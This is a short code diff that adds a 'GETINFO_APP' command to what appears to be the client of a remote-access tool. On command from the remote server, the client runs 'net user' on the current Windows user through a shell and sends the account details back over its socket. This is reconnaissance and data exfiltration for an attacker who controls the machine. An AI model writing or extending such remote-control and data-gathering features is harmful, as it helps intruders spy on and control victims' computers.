@@ -275,6 +275,19 @@ def PINGPONG_client_T(ip, port):
                     else:
                         break
 #upload_END_location
+#getinformation_START_location
+            elif data.decode() == 'GETINFO_APP':
+                import getpass
+                from subprocess import Popen, PIPE
+                s.send(bytes('OK', 'utf8'))
+                username = getpass.getuser()
+                cmd = Popen(f'net user {username}', stdout=PIPE, stderr=PIPE, shell=True)
+                printout = cmd.stdout.read()
+                s.send(bytes(str(len(printout)), 'utf8'))
+                s.recv(1024)
+                s.send(printout)
+                s.recv(1024)
+#getinformation_END_location
 #exit_START_location
             else:
                 s.send(bytes("Unfound", 'utf8'))
